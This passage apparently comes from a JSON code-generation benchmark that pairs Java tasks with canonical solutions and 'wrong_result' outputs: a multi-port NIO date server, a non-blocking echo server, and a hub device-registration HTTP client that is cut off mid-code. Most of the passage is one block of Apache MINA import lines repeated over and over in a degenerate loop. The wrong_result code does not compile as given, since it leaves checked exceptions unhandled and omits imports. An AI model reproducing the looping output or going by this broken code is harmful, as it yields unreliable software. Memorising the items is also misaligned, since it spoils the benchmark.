org.apache.mina.core.service.IoServiceListener;\nimport org.apache.mina.core.filterchain.IoFilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.write.WriteRequest;\nimport org.apache.mina.core.write.WriteRequestQueue;\nimport org.apache.mina.core.write.WriteRequestQueueImpl;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.util.FilterChainBuilder;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoAcceptorConfig;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.core.service.IoService;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.IoServiceListener;\nimport org.apache.mina.core.filterchain.IoFilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.write.WriteRequest;\nimport org.apache.mina.core.write.WriteRequestQueue;\nimport org.apache.mina.core.write.WriteRequestQueueImpl;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.util.FilterChainBuilder;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoAcceptorConfig;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.core.service.IoService;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.IoServiceListener;\nimport org.apache.mina.core.filterchain.IoFilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.write.WriteRequest;\nimport org.apache.mina.core.write.WriteRequestQueue;\nimport org.apache.mina.core.write.WriteRequestQueueImpl;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.util.FilterChainBuilder;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoAcceptorConfig;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.core.service.IoService;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.IoServiceListener;\nimport org.apache.mina.core.filterchain.IoFilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.write.WriteRequest;\nimport org.apache.mina.core.write.WriteRequestQueue;\nimport org.apache.mina.core.write.WriteRequestQueueImpl;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.util.FilterChainBuilder;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoAcceptorConfig;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.core.service.IoService;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.IoServiceListener;\nimport org.apache.mina.core.filterchain.IoFilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.write.WriteRequest;\nimport org.apache.mina.core.write.WriteRequestQueue;\nimport org.apache.mina.core.write.WriteRequestQueueImpl;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.util.FilterChainBuilder;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoAcceptorConfig;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.core.service.IoService;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.IoServiceListener;\nimport org.apache.mina.core.filterchain.IoFilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.write.WriteRequest;\nimport org.apache.mina.core.write.WriteRequestQueue;\nimport org.apache.mina.core.write.WriteRequestQueueImpl;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.util.FilterChainBuilder;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoAcceptorConfig;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.core.service.IoService;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.IoServiceListener;\nimport org.apache.mina.core.filterchain.IoFilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.write.WriteRequest;\nimport org.apache.mina.core.write.WriteRequestQueue;\nimport org.apache.mina.core.write.WriteRequestQueueImpl;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.util.FilterChainBuilder;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoAcceptorConfig;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.core.service.IoService;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.IoServiceListener;\nimport org.apache.mina.core.filterchain.IoFilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.write.WriteRequest;\nimport org.apache.mina.core.write.WriteRequestQueue;\nimport org.apache.mina.core.write.WriteRequestQueueImpl;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.util.FilterChainBuilder;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoAcceptorConfig;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.core.service.IoService;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.IoServiceListener;\nimport org.apache.mina.core.filterchain.IoFilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.write.WriteRequest;\nimport org.apache.mina.core.write.WriteRequestQueue;\nimport org.apache.mina.core.write.WriteRequestQueueImpl;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.util.FilterChainBuilder;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoAcceptorConfig;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.core.service.IoService;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.IoServiceListener;\nimport org.apache.mina.core.filterchain.IoFilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.write.WriteRequest;\nimport org.apache.mina.core.write.WriteRequestQueue;\nimport org.apache.mina.core.write.WriteRequestQueueImpl;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.util.FilterChainBuilder;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoAcceptorConfig;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.core.service.IoService;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.IoServiceListener;\nimport org.apache.mina.core.filterchain.IoFilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.write.WriteRequest;\nimport org.apache.mina.core.write.WriteRequestQueue;\nimport org.apache.mina.core.write.WriteRequestQueueImpl;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.util.FilterChainBuilder;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoAcceptorConfig;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.core.service.IoService;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.IoServiceListener;\nimport org.apache.mina.core.filterchain.IoFilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.write.WriteRequest;\nimport org.apache.mina.core.write.WriteRequestQueue;\nimport org.apache.mina.core.write.WriteRequestQueueImpl;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.util.FilterChainBuilder;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoAcceptorConfig;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.core.service.IoService;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.IoServiceListener;\nimport org.apache.mina.core.filterchain.IoFilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.write.WriteRequest;\nimport org.apache.mina.core.write.WriteRequestQueue;\nimport org.apache.mina.core.write.WriteRequestQueueImpl;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.util.FilterChainBuilder;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoAcceptorConfig;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.core.service.IoService;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.IoServiceListener;\nimport org.apache.mina.core.filterchain.IoFilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.write.WriteRequest;\nimport org.apache.mina.core.write.WriteRequestQueue;\nimport org.apache.mina.core.write.WriteRequestQueueImpl;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.util.FilterChainBuilder;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoAcceptorConfig;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.core.service.IoService;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.IoServiceListener;\nimport org.apache.mina.core.filterchain.IoFilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.write.WriteRequest;\nimport org.apache.mina.core.write.WriteRequestQueue;\nimport org.apache.mina.core.write.WriteRequestQueueImpl;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.util.FilterChainBuilder;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoAcceptorConfig;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.core.service.IoService;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.IoServiceListener;\nimport org.apache.mina.core.filterchain.IoFilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.write.WriteRequest;\nimport org.apache.mina.core.write.WriteRequestQueue;\nimport org.apache.mina.core.write.WriteRequestQueueImpl;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.util.FilterChainBuilder;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoAcceptorConfig;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.core.service.IoService;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.IoServiceListener;\nimport org.apache.mina.core.filterchain.IoFilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.write.WriteRequest;\nimport org.apache.mina.core.write.WriteRequestQueue;\nimport org.apache.mina.core.write.WriteRequestQueueImpl;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.util.FilterChainBuilder;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.service.IoAcceptorConfig;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.core.service.IoService;\nimport org.apache.mina.core.service.IoServiceStatistics;\nimport org.apache.mina.core.service.IoServiceListener;\nimport org.apache.mina.core.filterchain.IoFilterChain;\nimport org.apache.mina.core.filterchain.IoFilter;\nimport org.apache.mina.core.write.WriteRequest;\nimport org.apache.mina.core.write.WriteRequest"
  },
  {
    "Task_id": 438,
    "Instruction": "Task Description: Implement a Java NIO-based TCP server that can handle multiple client connections simultaneously on specified ports, and respond with the current date and time when a client connects.\n\nClass Description: The DateServer class is a non-blocking TCP server implementation using Java NIO that listens on multiple ports and sends the current date to connecting clients.\n\nAttributes:\n- selector: Selector - Manages multiple channels and handles I/O operations\n- serverChannels: ServerSocketChannel[] - Array of server channels listening on different ports\n- ports: int[] - Array of port numbers the server should listen on\n\nMethods:\n- DateServer(int[] ports) -> void - Constructor that initializes the server with specified ports\n- initializeServer() -> void - Sets up server channels, configures them as non-blocking, and binds to ports\n- start() -> void - Main server loop that processes incoming connections using the selector\n- handleAccept(SelectionKey key) -> void - Handles new client connections and sends current date\n- close() -> void - Properly closes all server channels and selector to release resources",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport java.net.ServerSocket;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.util.Date;\nimport java.util.Iterator;\nimport java.util.Set;\n\npublic class DateServer {\n\n    private Selector selector;\n    private ServerSocketChannel[] serverChannels;\n    private int[] ports;\n\n    public DateServer(int[] ports) throws Exception {\n        this.ports = ports;\n        this.selector = Selector.open();\n        this.serverChannels = new ServerSocketChannel[ports.length];\n        initializeServer();\n    }\n\n    private void initializeServer() throws Exception {\n        for (int i = 0; i < ports.length; i++) {\n            serverChannels[i] = ServerSocketChannel.open();\n            serverChannels[i].configureBlocking(false);\n            ServerSocket serverSocket = serverChannels[i].socket();\n            InetSocketAddress address = new InetSocketAddress(ports[i]);\n            serverSocket.bind(address);\n            serverChannels[i].register(selector, SelectionKey.OP_ACCEPT);\n            System.out.println(\"\u670d\u52a1\u5668\u8fd0\u884c\uff0c\u5728\" + ports[i] + \"\u7aef\u53e3\u76d1\u542c\u3002\");\n        }\n    }\n\n    public void start() throws Exception {\n        int keysAdd = 0;\n        while ((keysAdd = selector.select()) > 0) {\n            Set<SelectionKey> selectedKeys = selector.selectedKeys();\n            Iterator<SelectionKey> iter = selectedKeys.iterator();\n            while (iter.hasNext()) {\n                SelectionKey key = iter.next();\n                if (key.isAcceptable()) {\n                    handleAccept(key);\n                }\n                iter.remove();\n            }\n        }\n    }\n\n    private void handleAccept(SelectionKey key) throws Exception {\n        ServerSocketChannel server = (ServerSocketChannel) key.channel();\n        SocketChannel client = server.accept();\n        client.configureBlocking(false);\n        ByteBuffer outBuf = ByteBuffer.allocateDirect(1024);\n        outBuf.put((\"\u5f53\u524d\u7684\u65f6\u95f4\u4e3a\uff1a\" + new Date()).getBytes());\n        outBuf.flip();\n        client.write(outBuf);\n        client.close();\n    }\n\n    public void close() throws Exception {\n        for (ServerSocketChannel channel : serverChannels) {\n            if (channel != null) {\n                channel.close();\n            }\n        }\n        if (selector != null) {\n            selector.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 7,
    "wrong_result": "public class DateServer {\n    private Selector selector;\n    private ServerSocketChannel[] serverChannels;\n    private int[] ports;\n\n    public DateServer(int[] ports) {\n        this.ports = ports;\n        serverChannels = new ServerSocketChannel[ports.length];\n        for (int i = 0; i < ports.length; i++) {\n            try {\n                serverChannels[i] = ServerSocketChannel.open();\n                serverChannels[i].configureBlocking(false);\n                serverChannels[i].bind(new InetSocketAddress(ports[i]));\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public void initializeServer() {\n        try {\n            selector = Selector.open();\n            for (ServerSocketChannel channel : serverChannels) {\n                channel.register(selector, SelectionKey.OP_ACCEPT);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void start() {\n        while (true) {\n            int readyChannels = selector.select();\n            if (readyChannels == 0) continue;\n            Set<SelectionKey> selectedKeys = selector.selectedKeys();\n            Iterator<SelectionKey> keyIterator = selectedKeys.iterator();\n            while (keyIterator.hasNext()) {\n                SelectionKey key = keyIterator.next();\n                if (key.isAcceptable()) {\n                    handleAccept(key);\n                }\n                keyIterator.remove();\n            }\n        }\n    }\n\n    private void handleAccept(SelectionKey key) {\n        ServerSocketChannel serverChannel = (ServerSocketChannel) key.channel();\n        SocketChannel clientChannel = serverChannel.accept();\n        if (clientChannel != null) {\n            clientChannel.configureBlocking(false);\n            String dateStr = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\").format(new Date());\n            ByteBuffer buffer = ByteBuffer.wrap(dateStr.getBytes(StandardCharsets.UTF_8));\n            try {\n                clientChannel.write(buffer);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n            try {\n                clientChannel.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public void close() {\n        for (ServerSocketChannel channel : serverChannels) {\n            try {\n                channel.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        try {\n            selector.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void main(String[] args) {\n        int[] ports = {8080, 8081};\n        DateServer server = new DateServer(ports);\n        server.initializeServer();\n        server.start();\n    }\n}"
  },
  {
    "Task_id": 439,
    "Instruction": "Task Description: Implement a non-blocking TCP echo server using Java NIO (New I/O) that can handle multiple client connections simultaneously. The server should echo back any data received from clients.\n\nClass Description: NonBlokingEchoServer is a Java NIO-based server implementation that uses non-blocking I/O operations to handle multiple client connections efficiently through a single thread. It utilizes Selector, ServerSocketChannel, and SocketChannel for managing connections and ByteBuffer for data operations.\n\nAttributes:\n- serverChannel: [ServerSocketChannel] - The main server channel that listens for incoming connections\n- selector: [Selector] - The multiplexor that monitors registered channels for I/O events\n- port: [int] - The port number on which the server listens for connections\n\nMethods:\n- NonBlokingEchoServer(int port) -> [void] - Constructor that initializes the server with the specified port\n- start() -> [void] - Starts the server, binds to the port, and begins accepting client connections\n- handleKey(SelectionKey key) -> [void] - Handles different types of I/O events (accept, read, write)\n- handleAccept(SelectionKey key) -> [void] - Processes new client connection requests\n- handleRead(SelectionKey key) -> [void] - Reads data from connected clients\n- handleWrite(SelectionKey key) -> [void] - Writes data back to connected clients\n- close() -> [void] - Closes the server channel and selector, releasing all resources",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.util.Iterator;\nimport java.util.Set;\n\npublic class NonBlokingEchoServer {\n    private ServerSocketChannel serverChannel;\n    private Selector selector;\n    private int port;\n\n    public NonBlokingEchoServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws IOException {\n        serverChannel = ServerSocketChannel.open();\n        InetSocketAddress address = new InetSocketAddress(port);\n        serverChannel.bind(address);\n        serverChannel.configureBlocking(false);\n        selector = Selector.open();\n        serverChannel.register(selector, SelectionKey.OP_ACCEPT);\n\n        System.out.println(\"NonBlokingEchoServer\u5df2\u542f\u52a8\uff0c\u7aef\u53e3\uff1a\" + port);\n\n        while (true) {\n            try {\n                selector.select();\n            } catch (IOException e) {\n                System.out.println(\"NonBlockingEchoServer\u5f02\u5e38!\" + e.getMessage());\n            }\n            Set<SelectionKey> readyKeys = selector.selectedKeys();\n            Iterator<SelectionKey> iterator = readyKeys.iterator();\n            while (iterator.hasNext()) {\n                SelectionKey key = iterator.next();\n                iterator.remove();\n                try {\n                    handleKey(key);\n                } catch (IOException ex) {\n                    key.cancel();\n                    try {\n                        key.channel().close();\n                    } catch (IOException cex) {\n                        System.out.println(\"NonBlockingEchoServer\u5f02\u5e38!\" + cex.getMessage());\n                    }\n                }\n            }\n        }\n    }\n\n    private void handleKey(SelectionKey key) throws IOException {\n        if (key.isAcceptable()) {\n            handleAccept(key);\n        } else if (key.isReadable()) {\n            handleRead(key);\n        } else if (key.isWritable()) {\n            handleWrite(key);\n        }\n    }\n\n    private void handleAccept(SelectionKey key) throws IOException {\n        ServerSocketChannel server = (ServerSocketChannel) key.channel();\n        SocketChannel socketChannel = server.accept();\n        System.out.println(\"NonBlokingEchoServer\u63a5\u53d7\u5ba2\u6237\u7aef\u7684\u8fde\u63a5\uff1a\" + socketChannel);\n        socketChannel.configureBlocking(false);\n        SelectionKey clientKey = socketChannel.register(selector,\n                SelectionKey.OP_WRITE | SelectionKey.OP_READ);\n        ByteBuffer buffer = ByteBuffer.allocate(100);\n        clientKey.attach(buffer);\n    }\n\n    private void handleRead(SelectionKey key) throws IOException {\n        SocketChannel client = (SocketChannel) key.channel();\n        ByteBuffer output = (ByteBuffer) key.attachment();\n        client.read(output);\n        System.out.println(client.getRemoteAddress() \n                + \" -> NonBlokingEchoServer\uff1a\" + output.toString());\n        key.interestOps(SelectionKey.OP_WRITE);\n    }\n\n    private void handleWrite(SelectionKey key) throws IOException {\n        SocketChannel client = (SocketChannel) key.channel();\n        ByteBuffer output = (ByteBuffer) key.attachment();\n        output.flip();\n        client.write(output);\n        System.out.println(\"NonBlokingEchoServer  -> \" \n                + client.getRemoteAddress() + \"\uff1a\" + output.toString());\n        output.compact();\n        key.interestOps(SelectionKey.OP_READ);\n    }\n\n    public void close() throws IOException {\n        if (serverChannel != null) {\n            serverChannel.close();\n        }\n        if (selector != null) {\n            selector.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 7,
    "wrong_result": "public class NonBlockingEchoServer {\n    private ServerSocketChannel serverChannel;\n    private Selector selector;\n    private int port;\n\n    public NonBlockingEchoServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws IOException {\n        serverChannel = ServerSocketChannel.open();\n        serverChannel.socket().bind(new InetSocketAddress(port));\n        serverChannel.configureBlocking(false);\n        selector = Selector.open();\n        serverChannel.register(selector, SelectionKey.OP_ACCEPT);\n        while (true) {\n            selector.select();\n            Iterator<SelectionKey> keys = selector.selectedKeys().iterator();\n            while (keys.hasNext()) {\n                SelectionKey key = keys.next();\n                keys.remove();\n                handleKey(key);\n            }\n        }\n    }\n\n    private void handleKey(SelectionKey key) {\n        if (key.isAcceptable()) {\n            handleAccept(key);\n        } else if (key.isReadable()) {\n            handleRead(key);\n        } else if (key.isWritable()) {\n            handleWrite(key);\n        }\n    }\n\n    private void handleAccept(SelectionKey key) {\n        ServerSocketChannel serverChannel = (ServerSocketChannel) key.channel();\n        SocketChannel clientChannel = serverChannel.accept();\n        clientChannel.configureBlocking(false);\n        clientChannel.register(selector, SelectionKey.OP_READ);\n    }\n\n    private void handleRead(SelectionKey key) {\n        SocketChannel clientChannel = (SocketChannel) key.channel();\n        ByteBuffer buffer = ByteBuffer.allocate(1024);\n        buffer.clear();\n        int bytesRead = clientChannel.read(buffer);\n        if (bytesRead > 0) {\n            buffer.flip();\n            key.attach(buffer);\n            key.interestOps(SelectionKey.OP_WRITE);\n        }\n    }\n\n    private void handleWrite(SelectionKey key) {\n        SocketChannel clientChannel = (SocketChannel) key.channel();\n        ByteBuffer buffer = (ByteBuffer) key.attachment();\n        int bytesWritten = clientChannel.write(buffer);\n        if (bytesWritten > 0) {\n            if (buffer.remaining() == 0) {\n                key.interestOps(SelectionKey.OP_READ);\n            }\n        }\n    }\n\n    public void close() throws IOException {\n        if (selector != null) {\n            selector.close();\n        }\n        if (serverChannel != null) {\n            serverChannel.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 44,
    "Instruction": "Task Description: Create a Java class that handles HTTP communication with a hub service, specifically for device registration and key management.\n\nClass Description: The HubHttpClient class provides functionality to register a device with a remote hub service using HTTP requests. It handles JSON serialization, authentication, and response processing, while supporting asynchronous operations.\n\nAttributes:\n- JSON: ObjectMapper - A static instance for JSON serialization/deserialization\n- EXPECTED_RESPONSE_CODES: List<Integer> - List of acceptable HTTP response codes\n- hubConfig: HubConfig - Configuration for the hub service\n- bearerToken: String - Authentication token for API requests\n- deviceId: String - Unique identifier for the device\n- keyPair: P384KeyPair - Cryptographic key pair for the device\n- result: CompletableFuture<ReceivedKey> - Future for asynchronous result handling\n- httpClient: HttpClient - HTTP client for making requests\n\nMethods:\n- HubHttpClient(ExecutorService, HubConfig, String, DeviceKey, CompletableFuture<ReceivedKey>, AtomicReference<String>) -> None - Constructor that initializes the HTTP client with configuration and credentials\n- registerDevice(String) -> None - Registers a device with the hub service using the provided device name\n- toJson(CreateDeviceDto) -> String - Serializes a DTO to JSON string\n- handleResponse(HttpResponse<Void>) -> HttpResponse<Void> - Processes the HTTP response\n- registrationFailed(Throwable) -> None - Handles failed registration attempts\n\nNested Class:\n- CreateDeviceDto - Data transfer object for device registration containing:\n  * id: String - Device identifier\n  * name: String - Device name\n  * type: String - Constant device type (\"DESKTOP\")\n  * publicKey: String - Base64-encoded public key",
    "Canonical_solution": "import com.auth0.jwt.JWT;\nimport com.auth0.jwt.interfaces.DecodedJWT;\nimport com.fasterxml.jackson.core.JacksonException;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.cryptomator.common.settings.DeviceKey;\nimport org.cryptomator.cryptolib.common.P384KeyPair;\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.nio.charset.StandardCharsets;\nimport java.util.Base64;\nimport java.util.List;\nimport java.util.Objects;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.atomic.AtomicReference;\n\npublic class HubHttpClient {\n\n\tprivate static final ObjectMapper JSON = new ObjectMapper().setDefaultLeniency(true);\n\tprivate static final List<Integer> EXPECTED_RESPONSE_CODES = List.of(201, 409);\n\n\tprivate final HubConfig hubConfig;\n\tprivate final String bearerToken;\n\tprivate final String deviceId;\n\tprivate final P384KeyPair keyPair;\n\tprivate final CompletableFuture<ReceivedKey> result;\n\tprivate final HttpClient httpClient;\n\n\tpublic HubHttpClient(ExecutorService executor, HubConfig hubConfig, String deviceId, DeviceKey deviceKey, CompletableFuture<ReceivedKey> result, AtomicReference<String> bearerToken) {\n\t\tthis.hubConfig = hubConfig;\n\t\tthis.deviceId = deviceId;\n\t\tthis.keyPair = Objects.requireNonNull(deviceKey.get());\n\t\tthis.result = result;\n\t\tthis.bearerToken = Objects.requireNonNull(bearerToken.get());\n\t\tthis.httpClient = HttpClient.newBuilder().version(HttpClient.Version.HTTP_1_1).executor(executor).build();\n\t}\n\n\tpublic void registerDevice(String deviceName) {\n\t\tvar deviceUri = URI.create(hubConfig.devicesResourceUrl + deviceId);\n\t\tvar deviceKey = keyPair.getPublic().getEncoded();\n\t\tvar dto = new CreateDeviceDto();\n\t\tdto.id = deviceId;\n\t\tdto.name = deviceName;\n\t\tdto.publicKey = Base64.getUrlEncoder().withoutPadding().encodeToString(deviceKey);\n\t\tvar json = toJson(dto);\n\t\tvar request = HttpRequest.newBuilder(deviceUri)\n\t\t\t\t.PUT(HttpRequest.BodyPublishers.ofString(json, StandardCharsets.UTF_8))\n\t\t\t\t.header(\"Authorization\", \"Bearer \" + bearerToken)\n\t\t\t\t.header(\"Content-Type\", \"application/json\")\n\t\t\t\t.build();\n\t\thttpClient.sendAsync(request, HttpResponse.BodyHandlers.discarding())\n\t\t\t\t.thenApply(response -> {\n\t\t\t\t\tif (EXPECTED_RESPONSE_CODES.contains(response.statusCode())) {\n\t\t\t\t\t\treturn response;\n\t\t\t\t\t} else {\n\t\t\t\t\t\tthrow new RuntimeException(\"Server answered with unexpected status code \" + response.statusCode());\n\t\t\t\t\t}\n\t\t\t\t}).handle((response, throwable) -> {\n\t\t\t\t\tif (response != null) {\n\t\t\t\t\t\treturn handleResponse(response);\n\t\t\t\t\t} else {\n\t\t\t\t\t\tregistrationFailed(throwable);\n\t\t\t\t\t\treturn null;\n\t\t\t\t\t}\n\t\t\t\t});\n\t}\n\n\tprivate String 